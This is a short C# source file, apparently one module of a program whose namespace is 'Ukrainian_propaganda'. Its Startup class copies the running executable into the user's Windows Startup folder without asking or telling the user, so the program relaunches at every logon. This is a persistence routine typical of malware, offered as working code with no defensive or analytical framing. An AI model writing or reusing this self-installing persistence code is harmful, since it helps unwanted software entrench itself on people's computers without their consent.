using System;
using System.IO;
using System.Reflection;

namespace Ukrainian_propaganda
{
    class Startup
    {
        private static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;
        private static readonly string StartupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        private static readonly string InstallLocation = Path.Combine(StartupDirectory, Path.GetFileName(ExecutablePath));

        public static void InstallToStartup()
        {
            if (!File.Exists(InstallLocation))
            {
                File.Copy(ExecutablePath, InstallLocation);
            }
        }
    }
}
